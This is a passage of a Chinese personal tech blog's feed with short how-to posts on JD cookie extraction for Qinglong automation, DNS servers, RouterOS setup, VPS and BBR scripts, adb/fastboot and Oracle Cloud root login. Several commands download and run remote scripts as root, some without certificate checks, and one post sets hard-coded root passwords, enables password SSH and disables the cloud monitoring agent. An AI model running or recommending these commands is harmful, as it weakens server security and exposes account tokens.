<h2 id="安卓apk"><a href="#安卓apk" class="headerlink" title="安卓apk"></a>安卓apk</h2><p>下载:<a href="https://wwsf.lanzn.com/i4lb827kmr2b">https://wwsf.lanzn.com/i4lb827kmr2b</a> 密码:948t</p>
<p>青龙京东助手是一款专为青龙面板用户设计的桌面应用程序，它能够简化京东Cookie的获取和管理流程。用户可以通过这款软件一键登录京东，自动获取并显示Cookie，同时支持将Cookie直接发送到青龙面板，实现账号密码的快速填入青龙面板的环境变量的配置。</p>
<h2 id="功能说明"><a href="#功能说明" class="headerlink" title="功能说明"></a>功能说明</h2><ul>
<li><strong>一键发送至青龙面板</strong>：自动将京东账号的Cookie发送到青龙面板，简化操作流程。</li>
<li><strong>环境变量配置</strong>：在应用内直接配置青龙面板所需的环境变量，无需手动编辑配置文件。</li>
<li><strong>账号记录</strong>：支持记录多个京东账号，以换行分隔，格式为“账号 密码”，方便管理和切换。</li>
<li><strong>自动账号切换</strong>：选择特定账号密码后，软件自动切换到对应账号的输入界面。</li>
</ul>
<h2 id="使用说明"><a href="#使用说明" class="headerlink" title="使用说明"></a>使用说明</h2><ol>
<li><strong>登录京东</strong>：运行青龙京东助手程序，使用京东账号登录。</li>
<li><strong>获取Cookie</strong>：登录后，点击“获取”按钮，获取到的Cookie将显示在界面右侧。</li>
<li><strong>发送Cookie至青龙面板</strong>：若已配置青龙面板参数，点击“发送到青龙面板”即可一键同步。</li>
<li><strong>下载与运行</strong>：下载青龙京东助手，解压后运行<code>JD_Get.exe</code>程序。</li>
</ol>
<h2 id="青龙面板配置方法"><a href="#青龙面板配置方法" class="headerlink" title="青龙面板配置方法"></a>青龙面板配置方法</h2><ol>
<li><strong>登录青龙面板</strong>：在浏览器中打开青龙面板并登录。</li>
<li><strong>系统设置</strong>：进入系统设置页面。</li>
<li><strong>应用设置</strong>：选择“应用设置”。</li>
<li><strong>创建应用</strong>：在应用设置中创建一个新的应用。</li>
<li><strong>设置权限</strong>：确保新创建的应用具有所有必要的权限。</li>
<li><strong>获取参数</strong>：创建应用后，记录下<code>QL_ClientID</code>和<code>QL_ClientSecret</code>，这些参数将用于配置青龙京东助手。</li>
</ol>
]]></content>
      <categories>
        <category>tools</category>
        <category>docker</category>
        <category>qinglong</category>
      </categories>
      <tags>
        <tag>tools</tag>
        <tag>docker</tag>
        <tag>qinglong</tag>
      </tags>
  </entry>
  <entry>
    <title>DNS域名系统大全</title>
    <url>/posts/ffe4a5f9/</url>
    <content><![CDATA[<p>114 DNS<br>114.114.114.114<br>114.114.115.115</p>
<p>阿里 AliDNS<br>223.5.5.5<br>223.6.6.6</p>
<p>腾讯 DNSPod DNS+<br>119.29.29.29<br>182.254.116.116</p>
<p>Google DNS<br>8.8.8.8<br>8.8.4.4</p>
]]></content>
      <categories>
        <category>web</category>
        <category>domain</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>dns</tag>
      </tags>
  </entry>
  <entry>
    <title>带猫棒 sfp 的 ros 初始设置</title>
    <url>/posts/f10b19c6/</url>
    <content><![CDATA[<h1 id="1-首先下载winbox"><a href="#1-首先下载winbox" class="headerlink" title="1.首先下载winbox"></a>1.首先下载winbox</h1><h1 id="2-一头网线插电脑，一头网线插路由器，winbox进入可以用IP地址（通常情况下，ROS的默认ip地址是192-168-88-1，你需要将电脑网卡的IP设定192-168-88-X，X在2-255范围任意数字），也可以通过mac地址（mac地址，在背面）。"><a href="#2-一头网线插电脑，一头网线插路由器，winbox进入可以用IP地址（通常情况下，ROS的默认ip地址是192-168-88-1，你需要将电脑网卡的IP设定192-168-88-X，X在2-255范围任意数字），也可以通过mac地址（mac地址，在背面）。" class="headerlink" title="2.一头网线插电脑，一头网线插路由器，winbox进入可以用IP地址（通常情况下，ROS的默认ip地址是192.168.88.1，你需要将电脑网卡的IP设定192.168.88.X，X在2-255范围任意数字），也可以通过mac地址（mac地址，在背面）。"></a>2.一头网线插电脑，一头网线插路由器，winbox进入可以用IP地址（通常情况下，ROS的默认ip地址是192.168.88.1，你需要将电脑网卡的IP设定192.168.88.X，X在2-255范围任意数字），也可以通过mac地址（mac地址，在背面）。</h1><h1 id="3-默认账号admin，密码为空，填写好这些之后，点“Connect”就可以进入"><a href="#3-默认账号admin，密码为空，填写好这些之后，点“Connect”就可以进入" class="headerlink" title="3.默认账号admin，密码为空，填写好这些之后，点“Connect”就可以进入"></a>3.默认账号admin，密码为空，填写好这些之后，点“Connect”就可以进入</h1><h1 id="4-Bridge设置"><a href="#4-Bridge设置" class="headerlink" title="4.Bridge设置"></a>4.Bridge设置</h1><p>点“Interface”可以看到所有网卡。</p>
<p>sfp1是光模块网口，wlan1是2.4G无线，wlan是5G无线，默认情况下wlan1和wlan2都是关闭状态。鉴于有光模块的人不多，选中sfp1，上方的“X”按钮会变亮，直接点击，关闭sfp1网口（不关也没关系，但是不关总觉得不太舒服，通过上方的“勾”按钮</p>
<p>我是把1口接光猫，所以，双击ether1，修改name为wan，点OK保存。。</p>
<h1 id="5-网卡设置之后，进入Bridge"><a href="#5-网卡设置之后，进入Bridge" class="headerlink" title="5.网卡设置之后，进入Bridge"></a>5.网卡设置之后，进入Bridge</h1><p>name那里填lan即可，其他保持不变，直接点OK，Bridge就生成了（ROS的内网有2种工作模式。一种是指定一个网卡做Master，另外的网卡做Slave；另外一种，就是Bridge模式）</p>
<p>还是在“Bridge”，此时选“Ports”，通过“+”把除wan和sfp1网卡以外的，都加入这个“Bridge”<br>“Interface”不要选wan和sfp1，“Bridge”选“lan”</p>
<h1 id="6-DNS设置"><a href="#6-DNS设置" class="headerlink" title="6.DNS设置"></a>6.DNS设置</h1><p>“IP”–“DNS”设置下DNS，设置“DHCP”会用到。</p>
<h1 id="7-DHCP设置"><a href="#7-DHCP设置" class="headerlink" title="7.DHCP设置"></a>7.DHCP设置</h1><p>“IP”–“Addresses”设置下网关IP</p>
<p>Address我填写的是“192.168.0.1&#x2F;24”（你想用其他网段自行修改），Interface一定是选“lan”</p>
<p>“IP”–“DHCP Server”设置DHCP服务</p>
<h1 id="8-拨号设置"><a href="#8-拨号设置" class="headerlink" title="8. 拨号设置"></a>8. 拨号设置</h1><p>前面的基础工作做好了，可以开始拨号设置了。。。进入“Interface”<br>“Interfaces”选wan<br>user是拨号的账号，Password是拨号密码</p>
<p>如果看到pppoe-out1的前面变成R，并且Tx和Rx都有数字变化，说明拨号成功了<br>如果是光猫拨号的话，就不能用“DHCP Client”了</p>
<p>OK之后，DHCP Client能看到获取到的IP<br>要注意，在本文DHCP设置中，设置的网关IP，不要和光猫在同一个网段</p>
<h1 id="9-NAT设置"><a href="#9-NAT设置" class="headerlink" title="9.NAT设置"></a>9.NAT设置</h1><p>进入“IP”–“Firewall”–“NAT”</p>
<p>“Chain”一定选“srcnat”</p>
<p>“Src.Adderss”可以根据DHCP Server设置的地址段填写，也可以直接填“192.168.0.0&#x2F;24”,两者的区别是：前者只有DHCP范围内的IP才能上网，不在范围内的是不能上网的，哪怕他手动正确填写了有关的设置也不行。后者是整个网段（IP范围：192.168.0.1-192.168.0.255）都是可以上网的。</p>
<p>“Action”一定要选masquerade。。。点“OK”之后，你就可以愉快的上网了。。。。</p>
<h1 id="10-其他设置"><a href="#10-其他设置" class="headerlink" title="10.其他设置"></a>10.其他设置</h1><p>进入“System”–“Password”进行密码修改</p>
<p>“Old Password”留空。</p>
<p>“New Password”就行你准备设置的密码</p>
<p>“Confirm Password”再输入一次你的密码</p>
<p>点“Change”后，你的密码就设置成功了</p>
<p>除了密码外，还有个地方需要设置下，以提高安全性</p>
<p>进入“IP”–“Service”</p>
<p>把除了“winbox”和“www”以外的都“X”掉。。。。这样做，可以防止外部通过ssh，telnet等方式登录</p>
<h1 id="11-“Remove-Configuration”清除默认设置。如果不小心点了OK，也可以通过以下操作清除默认设置。“Syetem”–“Reset-Configuration”"><a href="#11-“Remove-Configuration”清除默认设置。如果不小心点了OK，也可以通过以下操作清除默认设置。“Syetem”–“Reset-Configuration”" class="headerlink" title="11.“Remove Configuration”清除默认设置。如果不小心点了OK，也可以通过以下操作清除默认设置。“Syetem”–“Reset Configuration”"></a>11.“Remove Configuration”清除默认设置。如果不小心点了OK，也可以通过以下操作清除默认设置。“Syetem”–“Reset Configuration”</h1><p>重启后，再通过mac地址进入winbox，继续点“Remove Configuration”清除默认设置就可以了。以后想重置，也是通过这个方法。</p>
<p>文章内容和代码来源于 <a href="https://post.smzdm.com/p/524883/">#原创新人# ROS的入门设置，强迫症重新设置Mikrotik RB962(hAP ac)</a> ，如有侵权请联系站长立即删除。</p>
]]></content>
      <categories>
        <category>os</category>
        <category>ros</category>
      </categories>
      <tags>
        <tag>os</tag>
        <tag>ros</tag>
      </tags>
  </entry>
  <entry>
    <title>vps 常用设置（修改时间，添加swap，虚拟内存，SSL一键申请）</title>
    <url>/posts/b68716a7/</url>
    <content><![CDATA[<h1 id="1-修改时间"><a href="#1-修改时间" class="headerlink" title="1.修改时间"></a>1.修改时间</h1><h2 id="1-1-首先，我们需要修改服务器的时间与我们本地的时间一致。"><a href="#1-1-首先，我们需要修改服务器的时间与我们本地的时间一致。" class="headerlink" title="1.1.首先，我们需要修改服务器的时间与我们本地的时间一致。"></a>1.1.首先，我们需要修改服务器的时间与我们本地的时间一致。</h2><p>香港的服务器的话时间是一样的，就无所谓了，如果是欧美的服务器，可以通过下面的方式修改</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo -i      <span class="comment">#切换到root用户</span></span><br><span class="line">apt update -y &amp;&amp; apt upgrade -y  <span class="comment">#更新一下包</span></span><br></pre></td></tr></table></figure>
<h2 id="1-2-先查看时间："><a href="#1-2-先查看时间：" class="headerlink" title="1.2.先查看时间："></a>1.2.先查看时间：</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">timedatectl</span><br></pre></td></tr></table></figure>
<h2 id="1-3-列出所有时区-改成上海"><a href="#1-3-列出所有时区-改成上海" class="headerlink" title="1.3.列出所有时区,改成上海"></a>1.3.列出所有时区,改成上海</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">timedatectl list-timezones</span><br><span class="line"></span><br><span class="line">sudo timedatectl set-timezone Asia/Shanghai</span><br></pre></td></tr></table></figure>

<h2 id="1-4-这边我们手动安装几个常用的命令-sudo-curl-wget"><a href="#1-4-这边我们手动安装几个常用的命令-sudo-curl-wget" class="headerlink" title="1.4.这边我们手动安装几个常用的命令(sudo, curl, wget)"></a>1.4.这边我们手动安装几个常用的命令(sudo, curl, wget)</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt install sudo curl wget </span><br></pre></td></tr></table></figure>

<p>然后重新运行</p>
<h1 id="2-添加SWAP"><a href="#2-添加SWAP" class="headerlink" title="2.添加SWAP"></a>2.添加SWAP</h1><p>swap是Linux中的虚拟内存，用于扩充物理内存不足而用来存储临时数据存在的。它类似于Windows中的虚拟内存。在Windows中，只可以使用文件来当作虚拟内存。而linux可以文件或者分区来当作虚拟内存。</p>
<p>这个虚拟内存对于内存小的VPS非常有必要，可以提高我们的运行效率。</p>
<h2 id="2-1-这里我们用脚本来添加"><a href="#2-1-这里我们用脚本来添加" class="headerlink" title="2.1.这里我们用脚本来添加"></a>2.1.这里我们用脚本来添加</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget -O box.sh https://raw.githubusercontent.com/BlueSkyXN/SKY-BOX/main/box.sh &amp;&amp; <span class="built_in">chmod</span> +x box.sh &amp;&amp; clear &amp;&amp; ./box.sh</span><br></pre></td></tr></table></figure>
<p>或者</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/zhucaidan/swap.sh/main/swap.sh &amp;&amp; bash swap.sh</span><br></pre></td></tr></table></figure>

<p>这边建议是2倍，我添加了1倍，也就是1024MB</p>
<h1 id="3-一键申请ssl证书脚本"><a href="#3-一键申请ssl证书脚本" class="headerlink" title="3.一键申请ssl证书脚本"></a>3.一键申请ssl证书脚本</h1><h2 id="项目地址：【点击进入】"><a href="#项目地址：【点击进入】" class="headerlink" title="项目地址：【点击进入】"></a>项目地址：【<a href="https://github.com/slobys/SSL-Renewal">点击进入</a>】</h2><h2 id="3-1-安装git"><a href="#3-1-安装git" class="headerlink" title="3.1.安装git"></a>3.1.安装git</h2><ul>
<li>Ubuntu&#x2F;Debian系统</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt install git -y</span><br></pre></td></tr></table></figure>

<ul>
<li>CentOS系统</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum install git -y</span><br></pre></td></tr></table></figure>

<h2 id="3-2-如果执行后出错，请先更新系统"><a href="#3-2-如果执行后出错，请先更新系统" class="headerlink" title="3.2.如果执行后出错，请先更新系统"></a>3.2.如果执行后出错，请先更新系统</h2><ul>
<li>（Debian&#x2F;Ubuntu系统）</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt update -y</span><br></pre></td></tr></table></figure>

<ul>
<li>（CentOS系统）</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo yum update -y</span><br></pre></td></tr></table></figure>

<h2 id="3-3-一键安装脚本"><a href="#3-3-一键安装脚本" class="headerlink" title="3.3.一键安装脚本"></a>3.3.一键安装脚本</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/slobys/SSL-Renewal.git /tmp/acme &amp;&amp; <span class="built_in">mv</span> /tmp/acme/* /root &amp;&amp; bash acme_2.0.sh</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>os</category>
        <category>ubuntu</category>
        <category>centos</category>
        <category>debian</category>
      </categories>
      <tags>
        <tag>os</tag>
        <tag>ubuntu</tag>
        <tag>debian</tag>
        <tag>centos</tag>
      </tags>
  </entry>
  <entry>
    <title>bbr加速脚本集合bbr plus/bbr原版/bbr魔改版</title>
    <url>/posts/25d27a92/</url>
    <content><![CDATA[<h1 id="1-下面所有脚本请自行安装Curl、Wget等，代码如下："><a href="#1-下面所有脚本请自行安装Curl、Wget等，代码如下：" class="headerlink" title="1.下面所有脚本请自行安装Curl、Wget等，代码如下："></a>1.下面所有脚本请自行安装Curl、Wget等，代码如下：</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum -y install wget    <span class="comment">#ContOS 安装 wget</span></span><br><span class="line">apt-get install wget   <span class="comment">#Debian Ubuntu 安装 wget</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum -y install curl    <span class="comment">#ContOS 安装 curl</span></span><br><span class="line">apt-get install curl   <span class="comment">#Debian Ubuntu 安装 crul</span></span><br></pre></td></tr></table></figure>

<h1 id="2-四合一-BBR-Plus-原版BBR-魔改BBR-（推荐）"><a href="#2-四合一-BBR-Plus-原版BBR-魔改BBR-（推荐）" class="headerlink" title="2.四合一 BBR Plus &#x2F; 原版BBR &#x2F; 魔改BBR （推荐）"></a>2.四合一 BBR Plus &#x2F; 原版BBR &#x2F; 魔改BBR （推荐）</h1><p>支持环境<br>Centos 7, Debian 8&#x2F;9, Ubuntu 16&#x2F;18 测试通过, 不支持 OVZ</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget -N --no-check-certificate <span class="string">&quot;https://raw.githubusercontent.com/chiakge/Linux-NetSpeed/master/tcp.sh&quot;</span> &amp;&amp; <span class="built_in">chmod</span> +x tcp.sh &amp;&amp; ./tcp.sh</span><br></pre></td></tr></table></figure>

<p>文章内容和代码来源于 <a href="https://www.v2rayssr.com/bbr.html">BBR加速脚本集合。包含BBR Plus&#x2F;BBR原版&#x2F;BBR魔改版，开启自带BBR加速，BBR四合一脚本等。</a> ，如有侵权请联系站长立即删除。</p>
]]></content>
      <categories>
        <category>web</category>
        <category>bbr</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>bbr</tag>
      </tags>
  </entry>
  <entry>
    <title>小黄鸟httpcanary抓包未root手机安装证书</title>
    <url>/posts/c0a3fb08/</url>
    <content><![CDATA[<h1 id="1-安装小黄鸟"><a href="#1-安装小黄鸟" class="headerlink" title="1. 安装小黄鸟"></a>1. 安装小黄鸟</h1><h1 id="2-设置"><a href="#2-设置" class="headerlink" title="2. 设置"></a>2. 设置</h1><h1 id="3-SSL证书设置"><a href="#3-SSL证书设置" class="headerlink" title="3. SSL证书设置"></a>3. SSL证书设置</h1><h1 id="4-导出HttpCanary根证书"><a href="#4-导出HttpCanary根证书" class="headerlink" title="4. 导出HttpCanary根证书"></a>4. 导出HttpCanary根证书</h1><h1 id="5-导出类型-Privacy-Enhanced-Mail（-pem）"><a href="#5-导出类型-Privacy-Enhanced-Mail（-pem）" class="headerlink" title="5. 导出类型 Privacy Enhanced Mail（.pem）"></a>5. 导出类型 Privacy Enhanced Mail（.pem）</h1><h1 id="6-打开手机的设置里面的安全方面设置（小米10-android11为例：设置-密码与安全-系统安全-加密与凭据-安装证书-CA证书）"><a href="#6-打开手机的设置里面的安全方面设置（小米10-android11为例：设置-密码与安全-系统安全-加密与凭据-安装证书-CA证书）" class="headerlink" title="6. 打开手机的设置里面的安全方面设置（小米10 android11为例：设置-密码与安全-系统安全-加密与凭据-安装证书-CA证书）"></a>6. 打开手机的设置里面的安全方面设置（小米10 android11为例：设置-密码与安全-系统安全-加密与凭据-安装证书-CA证书）</h1><h1 id="7-从SD卡安装"><a href="#7-从SD卡安装" class="headerlink" title="7. 从SD卡安装"></a>7. 从SD卡安装</h1><h1 id="8-找到上面路径里面的证书"><a href="#8-找到上面路径里面的证书" class="headerlink" title="8. 找到上面路径里面的证书"></a>8. 找到上面路径里面的证书</h1><h1 id="9-名字随便起，安装"><a href="#9-名字随便起，安装" class="headerlink" title="9. 名字随便起，安装"></a>9. 名字随便起，安装</h1><p>文章内容和代码来源于 <a href="https://www.52pojie.cn/thread-1593662-1-1.html">小黄鸟HttpCanary抓包 未Root手机安装证书</a> ，<a href="https://www.52pojie.cn/thread-1592529-1-1.html">小黄鸟HttpCanary抓包 5个版本 都是解锁版 + 证书安装教程。</a>如有侵权请联系站长立即删除。</p>
]]></content>
      <categories>
        <category>tools</category>
      </categories>
      <tags>
        <tag>tools</tag>
      </tags>
  </entry>
  <entry>
    <title>chrome 抓 jd cookie</title>
    <url>/posts/fa0fc22f/</url>
    <content><![CDATA[<h1 id="1-浏览器F12抓包"><a href="#1-浏览器F12抓包" class="headerlink" title="1.浏览器F12抓包"></a>1.浏览器F12抓包</h1><h2 id="1-1-打开网址登录http-m-jd-com"><a href="#1-1-打开网址登录http-m-jd-com" class="headerlink" title="1.1.打开网址登录http://m.jd.com"></a>1.1.打开网址登录<a href="http://m.jd.com/">http://m.jd.com</a></h2><h2 id="1-2登录后点击右下角”我的”-键盘按”F12”-点击上方”Network”-找到login开头链接-”Header”里面找”pt-pin”和”pt-key”"><a href="#1-2登录后点击右下角”我的”-键盘按”F12”-点击上方”Network”-找到login开头链接-”Header”里面找”pt-pin”和”pt-key”" class="headerlink" title="1.2登录后点击右下角”我的”,键盘按”F12”,点击上方”Network”,找到login开头链接,”Header”里面找”pt_pin”和”pt_key”"></a>1.2登录后点击右下角”我的”,键盘按”F12”,点击上方”Network”,找到login开头链接,”Header”里面找”pt_pin”和”pt_key”</h2><h1 id="2-插件抓包"><a href="#2-插件抓包" class="headerlink" title="2.插件抓包"></a>2.插件抓包</h1><h2 id="2-1-安装-EditThisCookie"><a href="#2-1-安装-EditThisCookie" class="headerlink" title="2.1.安装 EditThisCookie"></a>2.1.安装 <a href="https://chrome.google.com/webstore/detail/editthiscookie/fngmhnnpilhplaeedifhccceomclgfbg?utm_source=chrome-ntp-icon">EditThisCookie</a></h2><h2 id="2-2-点击浏览器右上角的插件图标，搜索”pt”-找到”pt-pin”和”pt-key”"><a href="#2-2-点击浏览器右上角的插件图标，搜索”pt”-找到”pt-pin”和”pt-key”" class="headerlink" title="2.2.点击浏览器右上角的插件图标，搜索”pt”, 找到”pt_pin”和”pt_key”"></a>2.2.点击浏览器右上角的插件图标，搜索”pt”, 找到”pt_pin”和”pt_key”</h2><p>文章内容和代码来源于 <a href="https://www.kejiwanjia.com/jiaocheng/zheteng/14177.html">通过浏览器获取cookie的方法</a> ，如有侵权请联系站长立即删除。</p>
]]></content>
      <categories>
        <category>web</category>
        <category>chrome</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>chrome</tag>
      </tags>
  </entry>
  <entry>
    <title>fastboot常用命令</title>
    <url>/posts/308dde1b/</url>
    <content><![CDATA[<h1 id="1-重启"><a href="#1-重启" class="headerlink" title="1.重启"></a>1.重启</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">fastboot reboot</span><br></pre></td></tr></table></figure>
<h1 id="2-刷写zip文件-文件内至少包含boot-img，system-img，recovery-img"><a href="#2-刷写zip文件-文件内至少包含boot-img，system-img，recovery-img" class="headerlink" title="2.刷写zip文件 文件内至少包含boot.img，system.img，recovery.img"></a>2.刷写zip文件 文件内至少包含boot.img，system.img，recovery.img</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">fastboot update xxxx.zip</span><br></pre></td></tr></table></figure>
<h1 id="3-擦除分区"><a href="#3-擦除分区" class="headerlink" title="3.擦除分区"></a>3.擦除分区</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">fastboot erase 分区</span><br></pre></td></tr></table></figure>
<h1 id="4-刷写分区"><a href="#4-刷写分区" class="headerlink" title="4.刷写分区"></a>4.刷写分区</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">fastboot flash 分区 xxxx.img</span><br></pre></td></tr></table></figure>
<h1 id="5-刷写所有分区-该操作将刷写文件夹内-adb-fastboot工具所在文件夹-的所有镜像文件到对应分区中，谨慎操作"><a href="#5-刷写所有分区-该操作将刷写文件夹内-adb-fastboot工具所在文件夹-的所有镜像文件到对应分区中，谨慎操作" class="headerlink" title="5.刷写所有分区 该操作将刷写文件夹内(adb&#x2F;fastboot工具所在文件夹)的所有镜像文件到对应分区中，谨慎操作"></a>5.刷写所有分区 该操作将刷写文件夹内(adb&#x2F;fastboot工具所在文件夹)的所有镜像文件到对应分区中，谨慎操作</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">fastboot flashall</span><br></pre></td></tr></table></figure>
<h1 id="6-列出已连接的fastboot设备"><a href="#6-列出已连接的fastboot设备" class="headerlink" title="6.列出已连接的fastboot设备"></a>6.列出已连接的fastboot设备</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">fastboot devices</span><br></pre></td></tr></table></figure>
<h1 id="7-重启到对应模式"><a href="#7-重启到对应模式" class="headerlink" title="7.重启到对应模式"></a>7.重启到对应模式</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">fastboot oem reboot-模式</span><br></pre></td></tr></table></figure>
<h1 id="8-查看fastboot工具版本号"><a href="#8-查看fastboot工具版本号" class="headerlink" title="8.查看fastboot工具版本号"></a>8.查看fastboot工具版本号</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">fastboot getver:version</span><br></pre></td></tr></table></figure>
<h1 id="9-查看设备bl锁状态"><a href="#9-查看设备bl锁状态" class="headerlink" title="9.查看设备bl锁状态"></a>9.查看设备bl锁状态</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">fastboot oem device-info</span><br></pre></td></tr></table></figure>

<p>文章内容和代码来源于 <a href="https://zhuanlan.zhihu.com/p/143179290">Fastboot指令合集</a> ，如有侵权请联系站长立即删除。</p>
]]></content>
      <categories>
        <category>os</category>
        <category>android</category>
      </categories>
      <tags>
        <tag>os</tag>
        <tag>android</tag>
      </tags>
  </entry>
  <entry>
    <title>android debug bridge adb常用命令</title>
    <url>/posts/d2b87cdf/</url>
    <content><![CDATA[<h1 id="platform-tools-r34-0-1-windows"><a href="#platform-tools-r34-0-1-windows" class="headerlink" title="platform-tools_r34.0.1-windows"></a>platform-tools_r34.0.1-windows</h1><p><a href="https://wwsf.lanzouw.com/ibEr50vma0va">https://wwsf.lanzouw.com/ibEr50vma0va</a> 密码:77xi</p>
<h1 id="1-安装软件"><a href="#1-安装软件" class="headerlink" title="1.安装软件"></a>1.安装软件</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">adb install apk文件名称.apk</span><br></pre></td></tr></table></figure>

<h1 id="2-重新安装该软件"><a href="#2-重新安装该软件" class="headerlink" title="2.重新安装该软件"></a>2.重新安装该软件</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">adb install -r apk文件名称.apk</span><br></pre></td></tr></table></figure>

<h1 id="3-卸载apk软件"><a href="#3-卸载apk软件" class="headerlink" title="3.卸载apk软件"></a>3.卸载apk软件</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">adb uninstall apk包名.apk</span><br></pre></td></tr></table></figure>

<h1 id="4-查看手机是否连接，以及连接了几台手机"><a href="#4-查看手机是否连接，以及连接了几台手机" class="headerlink" title="4.查看手机是否连接，以及连接了几台手机"></a>4.查看手机是否连接，以及连接了几台手机</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">adb devices</span><br></pre></td></tr></table></figure>

<h1 id="5-A为手机路径，B为电脑路径，意思为：把文件从手机中复制到电脑上"><a href="#5-A为手机路径，B为电脑路径，意思为：把文件从手机中复制到电脑上" class="headerlink" title="5.A为手机路径，B为电脑路径，意思为：把文件从手机中复制到电脑上"></a>5.A为手机路径，B为电脑路径，意思为：把文件从手机中复制到电脑上</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">adb pull &lt;A&gt; &lt;B&gt;</span><br></pre></td></tr></table></figure>

<h1 id="6-A为手机路径，B为电脑路径，意思为：把文件从电脑复制到手机上"><a href="#6-A为手机路径，B为电脑路径，意思为：把文件从电脑复制到手机上" class="headerlink" title="6.A为手机路径，B为电脑路径，意思为：把文件从电脑复制到手机上"></a>6.A为手机路径，B为电脑路径，意思为：把文件从电脑复制到手机上</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">adb push &lt;B&gt; &lt;A&gt;</span><br></pre></td></tr></table></figure>

<h1 id="7-重启手机"><a href="#7-重启手机" class="headerlink" title="7.重启手机"></a>7.重启手机</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">adb reboot</span><br></pre></td></tr></table></figure>

<h1 id="8-重启到Recovery界面"><a href="#8-重启到Recovery界面" class="headerlink" title="8.重启到Recovery界面"></a>8.重启到Recovery界面</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">adb reboot recovery</span><br></pre></td></tr></table></figure>

<h1 id="9-重启到bootloader界面"><a href="#9-重启到bootloader界面" class="headerlink" title="9.重启到bootloader界面"></a>9.重启到bootloader界面</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">adb reboot bootloader</span><br></pre></td></tr></table></figure>

<p>文章内容和代码来源于 <a href="https://baijiahao.baidu.com/s?id=1680251558956575002&wfr=spider&for=pc">史上最全ADB命令使用大全，一步教你成为玩机大神</a> ，如有侵权请联系站长立即删除。</p>
]]></content>
      <categories>
        <category>os</category>
        <category>android</category>
      </categories>
      <tags>
        <tag>os</tag>
        <tag>android</tag>
      </tags>
  </entry>
  <entry>
    <title>甲骨文oracle cloud 修改root 卸载监控 重装系统</title>
    <url>/posts/2791f59c/</url>
    <content><![CDATA[<h1 id="1-修改使用root登陆。逐一运行如下命令，"><a href="#1-修改使用root登陆。逐一运行如下命令，" class="headerlink" title="1.修改使用root登陆。逐一运行如下命令，"></a>1.修改使用root登陆。逐一运行如下命令，</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> root:zxsdw |sudo chpasswd root</span><br><span class="line">sudo sed -i <span class="string">&#x27;s/^#\?PermitRootLogin.*/PermitRootLogin yes/g&#x27;</span> /etc/ssh/sshd_config;</span><br><span class="line">sudo sed -i <span class="string">&#x27;s/^#\?PasswordAuthentication.*/PasswordAuthentication yes/g&#x27;</span> /etc/ssh/sshd_config;</span><br><span class="line">sudo service sshd restart</span><br></pre></td></tr></table></figure>
<p>默认密码是: zxsdw</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo -i</span><br><span class="line"><span class="built_in">echo</span> root:V2rayssr |chpasswd root</span><br><span class="line">sed -i <span class="string">&#x27;s/^#\?PermitRootLogin.*/PermitRootLogin yes/g&#x27;</span> /etc/ssh/sshd_config;</span><br><span class="line">sed -i <span class="string">&#x27;s/^#\?PasswordAuthentication.*/PasswordAuthentication yes/g&#x27;</span> /etc/ssh/sshd_config;</span><br><span class="line">service sshd restart</span><br></pre></td></tr></table></figure>
<p>默认密码是: V2rayssr</p>
<p>登录后一定要修改密码！密码修改命令：passwd</p>
<h1 id="2-卸载甲骨文内置脚本，这玩意特别卡，所以卸载之。逐一运行如下命令"><a href="#2-卸载甲骨文内置脚本，这玩意特别卡，所以卸载之。逐一运行如下命令" class="headerlink" title="2.卸载甲骨文内置脚本，这玩意特别卡，所以卸载之。逐一运行如下命令"></a>2.卸载甲骨文内置脚本，这玩意特别卡，所以卸载之。逐一运行如下命令</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl stop oracle-cloud-agent</span><br><span class="line">systemctl <span class="built_in">disable</span> oracle-cloud-agent</span><br><span class="line">systemctl stop oracle-cloud-agent-updater</span><br><span class="line">systemctl <span class="built_in">disable</span> oracle-cloud-agent-updater</span><br></pre></td></tr></table></figure>

